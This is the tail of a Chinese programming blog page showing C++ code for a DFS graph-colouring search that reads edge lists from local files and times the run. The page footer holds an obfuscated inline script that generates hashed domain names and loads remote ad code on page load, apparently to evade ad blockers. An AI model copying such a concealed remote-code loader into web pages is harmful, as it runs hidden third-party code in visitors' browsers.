                        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                S<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>isNew<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    s <span class="token operator">+</span><span class="token operator">=</span> ss <span class="token operator">*</span> <span class="token punctuation">(</span>COLOR <span class="token operator">-</span> used<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    sum <span class="token operator">+</span><span class="token operator">=</span> ss <span class="token operator">*</span> <span class="token punctuation">(</span>COLOR <span class="token operator">-</span> used <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                s <span class="token operator">+</span><span class="token operator">=</span> ss<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&gt;</span> <span class="token number">100000000</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            End <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            cout <span class="token operator">&lt;&lt;</span> End <span class="token operator">-</span> Start <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span>
            <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    Vertex S<span class="token punctuation">[</span>VERTEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
    <span class="token keyword">int</span> command<span class="token punctuation">;</span>
    cin <span class="token operator">&gt;&gt;</span> command<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"G:\MapData\MapR_5_90_500.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token comment">//打开文件</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can not open file!n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"G:\MapData\MapR_5_100_500.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token comment">//打开文件</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can not open file!n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"G:\MapData\MapR_5_110_500.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token comment">//打开文件</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can not open file!n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"G:\MapData\MapR_5_120_500.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token comment">//打开文件</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can not open file!n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>
    <span class="token keyword">char</span> ch<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> EDGE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%c%d%dn"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token operator">&amp;</span>u<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        map[u][v] = map[v][u] = 1;</span>
        map2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
        map2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>map2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>
        map2<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
        map2<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span>map2<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> u<span class="token punctuation">;</span>
        S<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token operator">++</span><span class="token punctuation">;</span>
        S<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"OK"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Start <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">DFS</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token function">getNext</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    End <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"TIME:"</span> <span class="token operator">&lt;&lt;</span> End <span class="token operator">-</span> Start <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ANSWER:"</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>